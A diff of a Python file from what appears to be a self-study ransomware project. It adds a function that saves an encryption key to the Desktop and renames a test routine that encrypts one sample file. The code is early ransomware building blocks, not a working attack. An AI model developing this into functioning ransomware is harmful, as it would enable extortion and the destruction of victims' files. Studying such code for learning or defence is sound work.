@@ -47,14 +47,23 @@ def generateRSAKeys():
     """Generate an RSA key pair"""
     # Generate an RSA key pair with a key length of 2048 bits
     key = RSA.generate(2048)
-
     private_key = key.export_key()
     public_key = key.publickey().export_key()
-
     print("Private key:\n", private_key.decode())
     print("\nPublic key:\n", public_key.decode())
 
-def test():
+def saveKey(key):
+    # Define the path to the desktop folder
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    if not os.path.exists(desktop_path):
+        print(f"The desktop directory {desktop_path} does not exist!")
+    else:
+        filename = "Key.key"
+        content = key
+        with open(os.path.join(desktop_path, filename), "w") as file:
+            file.write(content)
+
+def testEncryption():
     file_path = r'E:\Study\ransomware\file_test.txt'
     key = generate_key(16)
     with open(file_path, 'r') as f:
@@ -62,7 +71,5 @@ def test():
     encrypted_data = encrypt_data(key, data)
     with open('encrypted_file', 'wb') as f:
         f.write(encrypted_data)
-    with open('encrypted_file' + '.key', 'w') as f:
-        f.write(key)
+    saveKey(key)
 
-generateRSAKeys()
